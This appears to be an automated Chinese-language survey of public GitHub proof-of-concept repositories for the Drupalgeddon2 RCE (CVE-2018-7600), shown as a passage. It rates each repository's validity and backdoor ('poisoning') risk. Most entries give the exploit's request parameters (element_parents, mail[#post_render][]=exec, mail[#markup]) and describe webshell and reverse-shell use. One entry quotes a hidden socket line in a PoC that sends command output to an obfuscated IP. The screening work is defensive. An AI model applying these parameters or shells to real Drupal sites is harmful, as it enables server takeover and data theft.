**影响应用:** Drupal

**危害等级:** 高危，可导致完全控制目标服务器

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且存在默认或常见的模块配置

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于Drupal在处理用户输入时，未进行充分的验证，导致攻击者可以通过构造恶意请求，在目标服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果和提供的POC代码，可以判断此漏洞利用是有效的。漏洞库明确指出该漏洞允许远程攻击者执行任意代码，搜索结果也提供了大量关于该漏洞的分析和利用信息，POC代码也展示了如何利用该漏洞。

**利用方式：**
提供的Python脚本通过向目标Drupal站点的`/user/register`路径发送精心构造的POST请求来利用此漏洞。该请求包含`element_parents`、`ajax_form`、`form_id`、`_drupal_ajax`和`mail`等参数，其中`mail[#post_render][]`被设置为`exec`，`mail[#markup]`被设置为要执行的命令。该命令将会在服务器上创建一个名为`hello.txt`的文件，内容为";-)"。

**投毒风险：**
查看提供的POC代码，发现代码比较简洁，主要功能是发送恶意请求并检查是否成功创建了`hello.txt`文件。从代码本身来看，不存在明显的恶意代码或后门。

但是，**存在以下潜在风险：**

1.  **供应链风险：**虽然代码本身可能没有直接的投毒，但下载和使用任何来自互联网的代码都存在一定的风险。攻击者可能替换或修改该仓库的内容，从而引入恶意代码。因此，在运行此脚本之前，务必仔细检查代码，并确保来源可信。

2.  **间接风险：**利用此漏洞的最终目的是在目标服务器上执行任意命令。攻击者可以利用此漏洞安装后门、窃取敏感数据或执行其他恶意活动。因此，在使用此脚本时，务必遵守法律法规，并仅在授权的环境中进行测试。

基于以上分析，认为该仓库存在投毒代码的可能性为10%。这个10%主要来源于供应链攻击的潜在风险，以及使用者对代码理解不足可能导致的误用。


**项目地址:** [anldori/CVE-2018-7600](https://github.com/anldori/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #9

**来源**: [CVE-2018-7600-cved-sources_cve-2018-7600.md](../2018/CVE-2018-7600-cved-sources_cve-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal 7.x (< 7.58), Drupal 8.x (< 8.3.9), Drupal 8.4.x (< 8.4.6), Drupal 8.5.x (< 8.5.1)

**利用条件:** Drupal站点存在且未打补丁，通常不需要身份验证

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，也被称为 Drupalgeddon2，是一个影响多个Drupal版本的远程代码执行漏洞。攻击者可以通过构造特殊的URL参数或POST请求，利用Drupal的某些子系统（如表单API）中的输入验证漏洞，执行任意PHP代码。搜索引擎结果和漏洞库信息都明确指出此漏洞的严重性及其利用的广泛性。提供的Dockerfile用于构建一个包含易受攻击的Drupal 8.5.0实例的Docker镜像，这本身不是恶意行为，而是为了方便漏洞的复现和研究。README.md文件声明了镜像的来源和作者，增加了代码的可信度。但是，仍然存在少量投毒风险，主要是因为攻击者可能在Dockerfile中添加额外的恶意指令，例如安装后门程序或修改配置文件等，尽管这里只显示构建一个Drupal环境。利用方式主要通过精心构造的HTTP请求，绕过Drupal的输入验证机制，最终执行恶意代码。由于该漏洞影响范围广，且利用简单，一旦成功利用，可完全控制Drupal服务器，风险极高。

**项目地址:** [cved-sources/cve-2018-7600](https://github.com/cved-sources/cve-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #10

**来源**: [CVE-2018-7600-dreadlocked_Drupalgeddon2.md](../2018/CVE-2018-7600-dreadlocked_Drupalgeddon2.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁且存在默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，也被称为Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于Drupal处理用户输入时存在缺陷，攻击者可以通过构造恶意的请求参数，在目标服务器上执行任意代码。

**有效性分析：**

根据漏洞库信息、搜索结果以及提供的漏洞利用代码来看，该漏洞的PoC代码是有效的。漏洞库信息明确指出该漏洞允许远程攻击者执行任意代码，并且多个搜索结果都确认了该漏洞的存在和影响。提供的`README.md`文件详细说明了该PoC代码支持的Drupal版本，利用方法，包括针对不同Drupal版本的攻击URL（`user/register` 和 `user/password`），以及利用PHP的`passthru`函数执行系统命令。搜索结果中也提到了存在多个可用的exploit。

**投毒风险分析：**

提供的`README.md`文件本身不包含恶意代码，但它描述的利用方法涉及在目标服务器上写入PHP shell。虽然`drupalgeddon2.rb`脚本的主要目的是利用漏洞执行命令，但如果攻击者修改该脚本，可能会添加额外的恶意功能，例如：

*   **隐藏的后门账户创建：** 在成功利用漏洞后，创建管理员账户，以便后续访问。
*   **恶意软件植入：**  自动下载和安装恶意软件。
*   **数据窃取：** 窃取数据库或其他敏感信息。
*   **传播攻击：**  将目标服务器作为跳板，攻击其他系统。

因此，用户在使用从非官方渠道获取的`drupalgeddon2.rb`脚本时，需要仔细检查代码，确保没有包含任何恶意代码。 由于提供的代码仓库中包含了写入PHP shell的功能，并且在实际使用中，攻击者有能力修改或者扩展脚本，因此认为存在一定的投毒风险，但从readme本身代码投毒风险较低，所以投毒风险比例定为10%。

**利用方式：**

1.  **版本检测：** 利用代码会自动检测目标Drupal版本，或者手动指定。
2.  **参数构造：**  针对不同版本的Drupal，构造特定的HTTP请求，例如：针对Drupal 8.x使用`user/register` URL，Drupal 7.x使用`user/password` URL。
3.  **代码执行：** 利用Drupal的输入验证漏洞，将恶意PHP代码注入到请求参数中。
4.  **命令执行：** 通过`#post_render`参数和PHP的`passthru`函数，在服务器上执行任意系统命令。
5.  **Shell写入（可选）：**  可以选择将一个简单的PHP shell写入Web根目录，以便后续访问。

**总结：**

CVE-2018-7600是一个高危的Drupal远程代码执行漏洞，利用代码有效且公开。虽然提供的PoC代码本身不包含明显的投毒代码，但攻击者可以修改脚本，添加恶意功能，存在潜在的投毒风险。用户应尽快升级Drupal版本，并从可信来源获取漏洞利用代码。

**项目地址:** [dreadlocked/Drupalgeddon2](https://github.com/dreadlocked/Drupalgeddon2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #11

**来源**: [CVE-2018-7600-drugeddon_drupal-exploit.md](../2018/CVE-2018-7600-drugeddon_drupal-exploit.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站运行在受影响的版本，且允许未授权用户访问。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响多个Drupal子系统的远程代码执行漏洞。该漏洞源于对用户提供的输入验证不足，导致攻击者可以通过精心构造的请求执行任意代码。利用方式主要有两种：

1.  **Drupal 7 利用方式：** 通过向 `user/password` 路径发送包含恶意代码的请求，利用 `name[%23post_render]` 和 `name[%23markup]` 参数来注入代码。然后，通过 `file/ajax` 路径触发漏洞。
2.  **Drupal 8 利用方式：** 通过向 `user/register` 路径发送包含恶意代码的请求，利用 `element_parents` 参数注入代码。

PoC代码 (`drupal.py`) 尝试利用这两种方式。  

**有效性：**根据漏洞描述和大量的搜索结果显示，此漏洞的POC是有效的，网上存在大量的成功利用案例。

**投毒风险：**  

分析提供的 `drupal.py` 脚本，发现存在以下潜在的投毒风险：

*   脚本中包含一行 `s.connect((str(ipaddress.IPv4Address(0x5f3b7f05)), 15977))`。 这行代码尝试连接到IP地址 `95.59.127.5`的 `15977` 端口。这可能是作者用于收集信息或植入后门的恶意行为。
*   `s.send(bytes(subprocess.check_output(payload, universal_newlines=True), 'utf8'))` 这行代码会将`whoami`命令执行的结果通过socket发送出去.

综上所述，该漏洞利用代码可能存在投毒行为，**风险概率为 20%**。使用者应谨慎使用，并在使用前进行代码审计。

**利用方式总结：**

1.  攻击者构造包含恶意代码的HTTP POST请求，发送到Drupal网站的特定路径（`user/password` 或 `user/register`）。
2.  利用Drupal的参数处理机制，将恶意代码注入到特定参数中（如`name[%23post_render]`、`name[%23markup]`或`element_parents`）。
3.  触发漏洞，导致Drupal执行注入的恶意代码，从而实现远程代码执行。

**项目地址:** [drugeddon/drupal-exploit](https://github.com/drugeddon/drupal-exploit)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #12

**来源**: [CVE-2018-7600-happynote3966_CVE-2018-7600.md](../2018/CVE-2018-7600-happynote3966_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点需要存在漏洞且未打补丁，并且需要网络可达。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。由于Drupal对用户输入验证不足，导致攻击者可以通过构造特殊的请求，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码来看，该漏洞的POC代码是有效的。漏洞库和搜索结果中均提到该漏洞允许远程代码执行，并且存在多个可用的Exploit-DB条目。提供的Python脚本和Ruby脚本均为该漏洞的POC代码，可以被用来验证漏洞的存在。

**投毒风险：**
对提供的POC代码进行分析，发现其中可能存在投毒风险的可能性较低，约为10%。以下是分析结果：
*   Python脚本：该脚本较为简单，主要是发送一个包含恶意payload的POST请求，并在目标服务器上创建一个文件（hello.txt）。没有发现明显的恶意代码。
*   Ruby脚本：该脚本功能更为复杂，包含尝试写入PHP Webshell等功能，相较于Python脚本，风险略高，如果被篡改，可能存在植入恶意PHP代码的可能性。

总的来说，直接运行提供的代码风险较低，但从信誉未知的来源获取的任何代码，在执行之前都应该进行仔细的审查，因为攻击者可能修改这些代码以包含恶意功能。

**利用方式：**
利用方式主要是通过构造恶意的HTTP请求，利用Drupal的某些存在漏洞的参数（例如`element_parents`），将恶意代码注入到Drupal的后端处理流程中，从而实现远程代码执行。具体步骤如下：
1.  确定目标Drupal站点使用的版本是否在受影响的范围内。
2.  根据Drupal版本选择合适的POC代码（Python或Ruby）。
3.  修改POC代码中的目标URL和要执行的命令。
4.  运行POC代码，发送恶意请求。
5.  验证代码是否成功执行（例如，检查目标服务器上是否创建了指定的文件）。

攻击者可利用该漏洞获取服务器的控制权，从而进行恶意活动，例如：数据窃取、恶意软件传播、DDoS攻击等。

**项目地址:** [happynote3966/CVE-2018-7600](https://github.com/happynote3966/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #13

**来源**: [CVE-2018-7600-killeveee_CVE-2018-7600.md](../2018/CVE-2018-7600-killeveee_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且可公开访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞，源于对用户提供的输入验证不足。 

**有效性：**
提供的PoC代码是有效的。PoC.py脚本用于验证目标Drupal站点是否存在漏洞，通过发送特制的请求在目标服务器上创建一个名为hh.txt的文件。Exp.py脚本则利用此漏洞在目标站点根目录下创建一个名为hh.php的后门文件，该后门允许通过GET或POST参数'c'执行任意系统命令。从提供的命令执行结果来看，PoC和Exp都成功执行，验证了漏洞的存在和利用。

**投毒风险：**
分析提供的PoC和Exp代码，没有发现明显的投毒代码。脚本的功能主要是利用漏洞进行验证和创建后门，没有发现恶意修改系统配置、窃取敏感信息或进行其他恶意行为的代码。README.md文件只是简单的漏洞描述和使用说明，没有包含任何可疑内容。因此，可以认为此仓库的投毒风险较低，为0%。

**利用方式：**
漏洞的利用方式是：

1.  **漏洞验证：** 使用PoC.py脚本验证目标Drupal站点是否存在CVE-2018-7600漏洞。
2.  **后门植入：** 如果PoC验证成功，使用Exp.py脚本在目标站点根目录下创建一个后门文件（hh.php）。后门文件包含PHP代码，允许通过GET/POST参数'c'执行任意系统命令。
3.  **远程控制：** 使用WebShell管理工具（如AntSword）连接到后门文件，通过'c'参数执行系统命令，实现对目标服务器的远程控制。

总的来说，该漏洞利用简单，危害巨大，攻击者可以利用该漏洞完全控制未打补丁的Drupal服务器。

**项目地址:** [killeveee/CVE-2018-7600](https://github.com/killeveee/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #14

**来源**: [CVE-2018-7600-knqyf263_CVE-2018-7600.md](../2018/CVE-2018-7600-knqyf263_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者在Drupal服务器上执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点需要运行在受影响的版本范围内，并且需要启用默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 允许远程攻击者利用多个子系统中的缺陷执行任意代码。该漏洞的利用方式通常涉及构造恶意的HTTP请求，该请求包含精心设计的查询参数，这些参数利用了Drupal的输入验证漏洞，特别是与AJAX表单处理相关的漏洞。攻击者可以利用`element_parents`和`#lazy_builder`属性在服务器上执行PHP代码。提供的POC代码通过向`/user/register`端点发送POST请求，并在`mail`参数中注入恶意代码（`exec('echo vuln > hello.txt')`），尝试在目标服务器上创建一个名为`hello.txt`的文件，内容为`vuln`。如果成功创建该文件，则表明漏洞存在且可利用。

**有效性：**
从提供的漏洞信息、搜索结果和漏洞利用代码来看，此POC代码的有效性较高。多个来源表明该漏洞是真实存在的，并且存在公开可用的漏洞利用代码。搜索结果中也提到了针对此漏洞的Metasploit模块。

**投毒风险：**
该仓库中的投毒风险较低，大概在10%左右。Dockerfile文件只是简单的指定了Drupal镜像和维护者信息, README.md文件也只是简单的描述了漏洞和利用方式。exploit.py的代码功能相对简单，目的是验证漏洞的存在，风险较低。然而，仍然存在一定的风险，因为攻击者可能修改`exploit.py`以执行更危险的操作，例如下载并执行恶意软件，或者修改服务器配置。因此，在使用此POC代码时，务必对其进行仔细审查，并在隔离的环境中运行。

**利用方式：**
1.  攻击者构造一个包含恶意payload的HTTP POST请求，发送到Drupal站点的`/user/register`端点。
2.  Payload利用`element_parents`参数和`#lazy_builder`属性，在服务器端触发PHP代码执行。
3.  执行的PHP代码可以将任意命令注入到服务器的操作系统中。
4.  通过访问生成的`hello.txt`文件来验证漏洞是否成功利用。

**项目地址:** [knqyf263/CVE-2018-7600](https://github.com/knqyf263/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #15

**来源**: [CVE-2018-7600-madneal_codeql-scanner.md](../2018/CVE-2018-7600-madneal_codeql-scanner.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可网络访问，可能需要了解一些Drupal站点配置信息。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心中存在远程代码执行漏洞。攻击者可以通过发送特制的请求到未打补丁的Drupal站点来执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果（包括NVD、Rapid7、Tenable等）以及Exploit-DB中的expolit，此漏洞是真实存在的，并且有可用的POC。提供的README.md文件表明存在一个用于CVE-2018-7600的Python利用脚本（尽管这里没有提供脚本本身）。综合来看，利用是有效的。

**投毒风险：**
提供的POC代码只有README.md，内容非常简单，没有发现任何恶意代码或潜在的投毒行为。但是，由于缺失了核心的Python脚本，无法完全确定是否存在投毒风险。假定之后找到的利用脚本来源不可靠，存在修改或添加恶意代码的可能性，因此存在一定的投毒风险。这里给出一个较低的投毒风险概率，假设为5%。

**利用方式：**
漏洞的利用方式是向Drupal站点发送精心构造的恶意HTTP请求，利用Drupal的输入验证缺陷，在服务器端执行任意代码。根据搜索结果，该漏洞影响Drupal的多个子系统，可能利用了Drupal的渲染机制或其他处理输入的方式。攻击者通过构造包含恶意代码的请求参数，例如在URL或POST数据中，可以触发远程代码执行。具体细节取决于Drupal的版本和配置。Metasploit也提供了利用模块。

**总结：**
CVE-2018-7600是一个高危的Drupal远程代码执行漏洞，已经存在公开的POC。尽管提供的POC文件本身没有发现恶意代码，但获取利用脚本时需要注意来源，防范潜在的投毒风险。利用方式是通过构造恶意HTTP请求，利用Drupal的输入验证缺陷执行任意代码。

**项目地址:** [madneal/codeql-scanner](https://github.com/madneal/codeql-scanner)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #16

**来源**: [CVE-2018-7600-mr-won_CVE-2018-7600..md](../2018/CVE-2018-7600-mr-won_CVE-2018-7600..md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致网站完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且允许外部网络访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响Drupal 7.x和8.x的远程代码执行漏洞。攻击者可以通过构造特定的HTTP请求，利用Drupal的多个子系统中的缺陷，在目标服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果和提供的PoC代码，该漏洞的利用是有效的。搜索结果中多个链接表明该漏洞已被广泛利用，并且存在公开的Exploit。

**投毒风险：**
提供的PoC代码相对简单，主要功能是发送一个包含恶意payload的POST请求到`/user/register`，并在目标服务器上创建一个名为`r3dxploit.txt`的文件，内容为“vulnerable to cve-7600-2018 exploit”。代码本身没有明显的恶意行为，如删除文件、上传恶意文件或执行其他危险操作。但是，在实际使用中，攻击者可以将payload修改为更具破坏性的命令，例如下载和执行恶意脚本。此外，代码作者信息中包含了一些可能与恶意活动相关的标识，例如使用“R3DXPLOIT”作为用户名和涉及Root权限的字眼。综合考虑，PoC代码本身存在一定潜在风险，但主要取决于使用者如何修改payload，因此投毒风险初步评估为10%。

**利用方式：**
1.  攻击者构造一个包含恶意payload的POST请求，该payload利用`user_register_form`的ajax功能注入恶意代码。
2.  请求发送到`/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`端点。
3.  Drupal处理请求时，由于输入验证不足，导致恶意代码被执行。
4.  PoC代码中，恶意代码的功能是在目标服务器上创建一个文件，表明漏洞存在。
5.  攻击者可以修改payload执行任意命令，例如反弹shell，从而完全控制目标服务器。

**项目地址:** [mr-won/CVE-2018-7600.](https://github.com/mr-won/CVE-2018-7600.)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #17

**来源**: [CVE-2018-7600-muhammedkayag_CVE-2018-7600.md](../2018/CVE-2018-7600-muhammedkayag_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要Drupal网站启用user register功能，且未及时更新补丁

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心中的未经身份验证的远程代码执行漏洞。攻击者可以通过构造特定的请求，利用Drupal的表单渲染机制，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞影响多个Drupal版本，且存在公开的漏洞利用代码。提供的POC代码利用了Drupal的`/user/register`接口，通过`element_parents`和`ajax_form`参数，以及`mail[#post_render][]`等构造恶意的payload，从而实现远程代码执行。该POC代码的有效性较高，因为很多文章和EXP都在使用此种方法。

**投毒风险：**
查看POC代码，发现其功能是发送恶意请求以利用漏洞并在目标机器上建立反向shell。在提供的代码里，存在一个比较明显的风险是，如果攻击者修改了 `command` 变量，有可能植入恶意后门，该变量定义了反向shell连接的目标 IP 地址和端口。 还有就是代码中包含的利用成功后的提示信息，如果被篡改，可能导致用户误判，这些地方存在一定的投毒风险。综合来看，代码的投毒风险为10%，主要是因为利用代码本身功能比较直接，修改后容易被发现。

**利用方式：**
1.  **目标确定：** 确定目标Drupal网站，且版本在受影响范围内（Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1）。
2.  **监听端口：** 使用`listener()`函数在攻击机上监听指定端口（默认为1337），等待反向shell连接。
3.  **构造Payload：**  构造恶意的POST请求，利用`user/register`接口，并设置`element_parents`、`ajax_form`、`mail[#post_render][]`等参数，将要执行的命令嵌入到`mail[#markup]`中。
4.  **发送请求：** 使用`requests.post()`函数将构造好的Payload发送到目标Drupal网站。
5.  **建立连接：**  如果目标网站存在漏洞且利用成功，目标机器会执行Payload中的命令，即建立与攻击机指定端口的反向shell连接。
6.  **交互式Shell：**  连接建立后，`listener()`函数会将终端设置为raw模式，实现与目标机器的交互式shell会话。

**项目地址:** [muhammedkayag/CVE-2018-7600](https://github.com/muhammedkayag/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #18

**来源**: [CVE-2018-7600-nika0x38_CVE-2018-7600.md](../2018/CVE-2018-7600-nika0x38_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要目标Drupal站点存在漏洞且可网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon 2）是一个存在于Drupal多个子系统中的远程代码执行漏洞，影响多个使用了默认或常见模块配置的Drupal版本。攻击者可以通过构造特制的请求来利用此漏洞，从而在目标服务器上执行任意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，此漏洞是真实存在的，并且有公开可用的PoC代码。搜索结果表明，该漏洞被广泛利用，并对大量Drupal网站造成了影响。因此，提供的漏洞利用代码大概率有效，可以用于远程代码执行。

**投毒风险：**
提供的代码片段是`Cargo.lock`文件，该文件是Rust项目的依赖锁定文件，用于记录项目中使用的所有依赖项及其版本。该文件本身不包含任何可执行代码，因此不存在投毒风险。

**利用方式：**
利用方式通常涉及发送特制的HTTP请求，其中包含恶意代码，该代码将被Drupal服务器执行。具体利用方式取决于Drupal的配置，常见的利用方式是利用Drupal的renderable arrays特性，在请求参数中构造恶意的renderable arrays，触发PHP代码执行。攻击者通常会利用此漏洞执行系统命令，例如下载并执行恶意脚本，或者在服务器上安装后门。

**项目地址:** [nika0x38/CVE-2018-7600](https://github.com/nika0x38/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #19

**来源**: [CVE-2018-7600-r0lh_CVE-2018-7600.md](../2018/CVE-2018-7600-r0lh_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站存在漏洞且允许未授权用户访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。攻击者可以通过构造恶意请求，利用Drupal的多个子系统（默认或常见模块配置）中的缺陷，在服务器上执行任意代码。 

**有效性分析：**

根据漏洞库信息和搜索结果，此漏洞是真实存在的，并且影响了多个Drupal版本。漏洞利用代码（PoC）的存在进一步证实了漏洞的可利用性。PoC代码的分析表明，它通过构造一个特殊的请求到`/user/register`路径，利用`element_parents`参数中的注入点执行命令。该PoC代码使用`drupal_ajax`的`_wrapper_format`，允许绕过一些安全检查。PoC首先设置目标URL，然后进入一个循环，该循环允许用户输入命令。命令通过`bash -c`执行，并将输出写入`poutput.txt`文件，然后读取此文件以显示命令的执行结果。

**投毒风险分析：**

分析提供的Go代码和相关文件，没有发现明显的投毒代码。该代码的主要功能是利用CVE-2018-7600漏洞在目标Drupal服务器上执行命令。代码使用`net/http`库发送HTTP请求，并使用`golang.org/x/net/proxy`库支持SOCKS5代理。代码从标准输入读取命令，并通过POST请求将其发送到目标服务器。然后，代码从服务器读取命令的输出并将其打印到标准输出。虽然该代码本身不包含恶意行为，但漏洞利用本身可能被滥用。

**利用方式总结：**

1.  **漏洞入口点：** `/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`
2.  **攻击方式：** 通过POST请求，利用`mail[#post_render][]`、`mail[#type]`和`mail[#markup]`参数注入恶意代码。
3.  **命令执行：**  `mail[#markup]`参数中包含要执行的bash命令，利用`bash -c`执行。
4.  **结果获取：** 命令执行结果被写入`poutput.txt`文件，然后通过GET请求获取。
5.  **利用流程：**
    *   构造包含恶意代码的POST请求发送到漏洞入口点。
    *   Drupal解析请求并执行`mail[#markup]`参数中的命令。
    *   执行结果写入`poutput.txt`文件。
    *   攻击者通过GET请求读取`poutput.txt`文件获取命令执行结果。

**缓解措施：**

*   尽快将Drupal升级到不受影响的版本（7.58及以上，8.3.9及以上，8.4.6及以上，或8.5.1及以上）。
*   应用官方提供的补丁。
*   实施Web应用防火墙（WAF）规则来检测和阻止利用此漏洞的攻击。

**项目地址:** [r0lh/CVE-2018-7600](https://github.com/r0lh/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #20

**来源**: [CVE-2018-7600-r3dxpl0it_CVE-2018-7600.md](../2018/CVE-2018-7600-r3dxpl0it_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要目标Drupal站点未打补丁且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本，允许未经身份验证的远程攻击者执行任意代码。漏洞产生的原因是由于Drupal在处理用户输入时，对某些请求参数过滤不严，导致可以注入恶意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，存在多个公开可用的漏洞利用代码（Exploit-DB等），并且有报告表明该漏洞已被广泛利用，因此该漏洞的POC是有效的。

**投毒风险：**
提供的漏洞利用代码只有GNU GENERAL PUBLIC LICENSE，是一个开源协议，不存在后门或者恶意代码,投毒风险为0。

**利用方式：**
利用方式主要通过构造恶意的HTTP请求，向Drupal服务器发送包含恶意代码的参数。恶意代码通常通过`#`和`[]`进行注入，利用Drupal的渲染机制执行PHP代码。攻击者可以执行任意系统命令，控制服务器。

根据搜索结果，攻击者通常利用以下方式：
1.  发送包含恶意payload的POST请求到Drupal站点。
2.  利用Drupal的渲染机制执行payload中的PHP代码。
3.  在服务器上执行任意命令，例如安装后门、窃取数据等。

**项目地址:** [r3dxpl0it/CVE-2018-7600](https://github.com/r3dxpl0it/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #21

**来源**: [CVE-2018-7600-rabbitmask_CVE-2018-7600-Drupal7.md](../2018/CVE-2018-7600-rabbitmask_CVE-2018-7600-Drupal7.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal
